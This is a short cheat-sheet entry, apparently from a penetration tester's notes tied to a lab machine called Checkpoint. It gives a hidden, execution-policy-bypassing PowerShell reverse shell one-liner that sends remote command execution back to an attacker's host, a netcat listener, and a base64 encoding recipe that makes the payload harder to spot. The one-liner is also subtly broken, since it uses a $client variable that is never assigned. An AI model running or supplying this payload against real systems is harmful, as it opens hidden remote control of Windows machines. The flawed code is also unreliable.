# PowerShell Reverse Shell

A standard reverse shell payload using PowerShell. Useful on Windows targets when code execution accepts a one-liner or when a payload needs to be base64-encoded for `-EncodedCommand`.

Used on: **Checkpoint**

## One-Liner

<!-- cmd: windows -->
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$LHOST",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Listener

<!-- cmd: linux -->
```bash
nc -lvnp 4444
```

## Encoding

PowerShell `-EncodedCommand` expects UTF-16LE bytes before base64 encoding:

<!-- cmd: linux -->
```bash
echo -n '<POWERSHELL_PAYLOAD>' | iconv -t UTF-16LE | base64 -w0
```
